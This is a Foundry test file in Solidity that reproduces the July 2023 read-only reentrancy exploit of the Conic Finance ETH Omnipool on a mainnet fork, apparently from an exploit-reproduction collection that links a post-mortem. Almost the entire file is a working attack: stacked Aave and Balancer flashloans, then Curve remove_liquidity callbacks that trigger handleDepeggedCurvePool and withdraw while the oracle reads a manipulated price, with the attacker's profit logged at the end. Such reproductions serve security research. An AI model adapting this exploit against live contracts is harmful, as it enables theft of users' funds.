// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~3.25M USD$
// Attacker : https://etherscan.io/address/0x8d67db0b205e32a5dd96145f022fa18aae7dc8aa
// Attack Contract : https://etherscan.io/address/0x743599ba5cfa3ce8c59691af5ef279aaafa2e4eb
// Vulnerable Contract : https://etherscan.io/address/0xbb787d6243a8d450659e09ea6fd82f1c859691e9
// Attack Tx : https://etherscan.io/tx/0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xbb787d6243a8d450659e09ea6fd82f1c859691e9#code

// @Analysis
// Post-mortem : https://medium.com/@ConicFinance/post-mortem-eth-and-crvusd-omnipool-exploits-c9c7fa213a3d
// Twitter Guy : https://twitter.com/BlockSecTeam/status/1682356244299010049

interface IConicEthPool {
    function handleDepeggedCurvePool(address) external;

    function deposit(uint256 underlyingAmount, uint256 minLpReceived, bool stake) external returns (uint256);

    function withdraw(uint256 conicLpAmount, uint256 minUnderlyingReceived) external returns (uint256);
}

interface IGenericOracleV2 {
    function getUSDPrice(address) external returns (uint256);
}

interface ICurve {
    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external payable returns (uint256);

    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);

    function remove_liquidity(
        uint256 token_amount,
        uint256[2] memory min_amounts,
        bool use_eth,
        address receiver
    ) external;
}

contract ContractTest is Test {
    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 rETH = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IERC20 cbETH = IERC20(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704);
    IERC20 steCRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IERC20 cbETH_ETH_LP = IERC20(0x5b6C539b224014A09B3388e51CaAA8e354c959C8);
    IERC20 rETH_ETH_LP = IERC20(0x6c38cE8984a890F5e46e6dF6117C26b3F1EcfC9C);
    IERC20 cncETH = IERC20(0x3565A68666FD3A6361F06f84637E805b727b4A47);
    ICurve rETH_ETH_Pool = ICurve(0x0f3159811670c117c372428D4E69AC32325e4D0F);
    ICurve cbETH_ETH_Pool = ICurve(0x5FAE7E604FC3e24fd43A72867ceBaC94c65b404A);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan aaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    ICurvePool LidoCurvePool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IConicEthPool ConicEthPool = IConicEthPool(0xBb787d6243a8D450659E09ea6fD82F1C859691e9);
    IGenericOracleV2 Oracle = IGenericOracleV2(0x286eF89cD2DA6728FD2cb3e1d1c5766Bcea344b0);
    uint256 nonce;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_740_954);
        vm.label(address(WETH), "WETH");
        vm.label(address(steCRV), "steCRV");
        vm.label(address(cbETH_ETH_LP), "cbETH_ETH_LP");
        vm.label(address(rETH_ETH_LP), "rETH_ETH_LP");
        vm.label(address(cncETH), "cncETH");
        vm.label(address(stETH), "stETH");
        vm.label(address(rETH), "rETH");
        vm.label(address(cbETH), "cbETH");
        vm.label(address(LidoCurvePool), "LidoCurvePool");
        vm.label(address(rETH_ETH_Pool), "rETH_ETH_Pool");
        vm.label(address(cbETH_ETH_Pool), "cbETH_ETH_Pool");
        vm.label(address(cncETH), "cncETH");
        vm.label(address(Balancer), "Balancer");
        vm.label(address(aaveV3), "aaveV3");
        vm.label(address(aaveV2), "aaveV2");
        vm.label(address(ConicEthPool), "ConicEthPool");
        vm.label(address(Oracle), "Oracle");
    }

    function testExploit() external {
        deal(address(this), 0);
        WETH.approve(address(rETH_ETH_Pool), type(uint256).max);
        WETH.approve(address(LidoCurvePool), type(uint256).max);
        WETH.approve(address(cbETH_ETH_Pool), type(uint256).max);
        WETH.approve(address(ConicEthPool), type(uint256).max);
        stETH.approve(address(LidoCurvePool), type(uint256).max);
        rETH.approve(address(rETH_ETH_Pool), type(uint256).max);
        cbETH.approve(address(cbETH_ETH_Pool), type(uint256).max);

        aaveV2Flashloan();

        sellAllTokenToWETH();
        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function aaveV2Flashloan() internal {
        address[] memory assets = new address[](1);
        assets[0] = address(stETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 20_000 ether;
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;
        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    // @Info aaveV2 flashLoan callback
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        aaveV3.flashLoanSimple(address(this), address(cbETH), 850 ether, new bytes(0), 0);
        IERC20(assets[0]).approve(address(aaveV2), amounts[0] + premiums[0]);
        return true;
    }

    // @Info aaveV3 flashLoan callback
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initator,
        bytes calldata params
    ) external payable returns (bool) {
        balancerFlashloan();
        IERC20(asset).approve(address(aaveV3), premium + amount);
        return true;
    }

    function balancerFlashloan() internal {
        address[] memory tokens = new address[](3);
        tokens[0] = address(rETH);
        tokens[1] = address(cbETH);
        tokens[2] = address(WETH);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 20_550 ether;
        amounts[1] = 3000 ether;
        amounts[2] = 28_504.2 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    // @Info balancerVault flashLoan callback
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // repeatedly deposit WETH to ConicEthPool and swap cbETH,rETH to WETH
        for (uint256 i; i < 7; ++i) {
            ConicEthPool.deposit(1214 ether, 0, false);
            cbETH_ETH_Pool.exchange(1, 0, 121 ether, 0);
            rETH_ETH_Pool.exchange(1, 0, 121 ether, 0);
        }

        reenter_1();

        emit log_named_decimal_uint(
            "before Read-Only-Reentrancy cbETH_ETH_LP Price",
            Oracle.getUSDPrice(address(cbETH_ETH_LP)),
            cbETH_ETH_LP.decimals()
        );
        reenter_2();

        emit log_named_decimal_uint(
            "before Read-Only-Reentrancy rETH_ETH_LP Price",
            Oracle.getUSDPrice(address(rETH_ETH_LP)),
            rETH_ETH_LP.decimals()
        );
        reenter_3();

        // repay flashLoan
        rETH_ETH_Pool.exchange(0, 1, 3450 ether, 0); // swap WETH to rETH
        cbETH_ETH_Pool.exchange(0, 1, 850 ether, 0); // swap WETH to cbETH
        ConicEthPool.withdraw(cncETH.balanceOf(address(this)), 0);
        WETH.deposit{value: address(this).balance}();
        rETH_ETH_Pool.exchange(0, 1, 1100 ether, 0); // swap WETH to rETH
        WETH.withdraw(300 ether);
        LidoCurvePool.exchange{value: 300 ether}(0, 1, 300 ether, 0); // swap WETH to stETH

        IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);
        IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);
        IERC20(tokens[2]).transfer(msg.sender, amounts[2] + feeAmounts[2]);
    }

    function reenter_1() internal {
        WETH.withdraw(20_000 ether);
        uint256[2] memory amount;
        amount[0] = 20_000 ether;
        amount[1] = stETH.balanceOf(address(this));
        LidoCurvePool.add_liquidity{value: 20_000 ether}(amount, 0); // mint steCRV
        amount[0] = 0;
        amount[1] = 0;
        emit log_named_decimal_uint(
            "before Read-Only-Reentrancy steCRV Price", Oracle.getUSDPrice(address(steCRV)), steCRV.decimals()
        );
        nonce++;
        LidoCurvePool.remove_liquidity(steCRV.balanceOf(address(this)), amount); // burn steCRV, first reentrancy enter point
    }

    function reenter_2() internal {
        uint256[2] memory amount;
        WETH.withdraw(WETH.balanceOf(address(this)) - 4 ether);
        cbETH_ETH_Pool.exchange(1, 0, cbETH.balanceOf(address(this)), 0); // swap cbETH to WETH
        amount[0] = 1.8 ether;
        amount[1] = 0;
        cbETH_ETH_Pool.add_liquidity(amount, 0); // mint cbETH/ETH-f
        amount[0] = 0;

        nonce++;
        cbETH_ETH_Pool.remove_liquidity(cbETH_ETH_LP.balanceOf(address(this)), amount, true, address(this)); // burn cbETH/ETH-f, second reentrancy enter point
    }

    function reenter_3() internal {
        cbETH_ETH_Pool.exchange(0, 1, WETH.balanceOf(address(this)), 0); // swap WETH to cbETH
        rETH_ETH_Pool.exchange(1, 0, rETH.balanceOf(address(this)), 0); // swap rETH to WETH
        uint256[2] memory amount;
        amount[0] = 2.4 ether;
        amount[1] = 0;
        rETH_ETH_Pool.add_liquidity(amount, 0); // mint rETH/ETH-f
        amount[0] = 0;

        nonce++;
        rETH_ETH_Pool.remove_liquidity(rETH_ETH_LP.balanceOf(address(this)), amount, true, address(this)); // burn rETH/ETH-f, third reentrancy enter point
    }

    receive() external payable {
        if (msg.sender != address(WETH)) {
            if (nonce == 1) {
                emit log_named_decimal_uint(
                    "In Read-Only-Reentrancy steCRV Price", Oracle.getUSDPrice(address(steCRV)), steCRV.decimals()
                );
                ConicEthPool.handleDepeggedCurvePool(address(LidoCurvePool)); // set LidoCurvePool as depegged pool
            } else if (nonce == 2) {
                emit log_named_decimal_uint(
                    "In Read-Only-Reentrancy cbETH_ETH_LP Price",
                    Oracle.getUSDPrice(address(cbETH_ETH_LP)),
                    cbETH_ETH_LP.decimals()
                );
                ConicEthPool.handleDepeggedCurvePool(address(cbETH_ETH_Pool)); // set cbETH_ETH_Pool as depegged pool
            } else if (nonce == 3) {
                emit log_named_decimal_uint(
                    "In Read-Only-Reentrancy rETH_ETH_LP Price",
                    Oracle.getUSDPrice(address(rETH_ETH_LP)),
                    rETH_ETH_LP.decimals()
                );
                ConicEthPool.withdraw(6292 ether, 0); // withdraw assets from ConicEthPool
                nonce++;
            }
        }
    }

    function sellAllTokenToWETH() internal {
        cbETH_ETH_Pool.exchange(1, 0, cbETH.balanceOf(address(this)), 0);
        rETH_ETH_Pool.exchange(1, 0, rETH.balanceOf(address(this)), 0);
        LidoCurvePool.exchange(1, 0, stETH.balanceOf(address(this)), 0);
        WETH.deposit{value: address(this).balance}();
    }
}
